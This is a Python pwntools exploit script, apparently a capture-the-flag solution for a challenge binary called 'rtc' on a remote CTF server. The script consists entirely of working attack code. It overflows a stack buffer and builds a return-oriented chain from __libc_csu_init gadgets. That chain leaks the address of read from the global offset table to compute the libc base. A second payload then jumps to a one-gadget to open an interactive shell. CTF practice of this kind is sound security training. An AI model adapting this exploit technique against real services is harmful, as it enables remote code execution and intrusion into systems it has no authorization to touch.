from pwn import *
#r=process("./rtc")
r=remote("ctf.j0n9hyun.xyz",3025)
oneshot=[0x45216,0x4526a,0xf02a4,0xf1147]
b=ELF("./rtc")
libc=ELF("libc.so.6")
context.log_level='debug'
pr2345=0x00000000004006ba # pop r12,r13,r14,r15 ;ret
call=0x0000000000400696 # call r12, edi=r15, rsi=r14, rdx=r13
read=b.got['read']
write=b.got['write']
main=b.symbols['main']

p1=b'x'*0x40
p1+=b'x'*0x8
p1+=p64(pr2345)
p1+=p64(0)
p1+=p64(1)
p1+=p64(write)
p1+=p64(8)
p1+=p64(b.got['read'])
p1+=p64(1)
p1+=p64(call)
p1+=p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)+p64(0)
p1+=p64(main)

r.sendlineafter("?\n",p1)
libcbase=u64(r.recv(8))-libc.symbols['read']
for i in range(len(oneshot)):
    oneshot[i]+=libcbase
print(hex(libcbase))
p2=b'x'*0x40
p2+=b'x'*8
p2+=p64(oneshot[1])
r.sendline(p2)
r.interactive()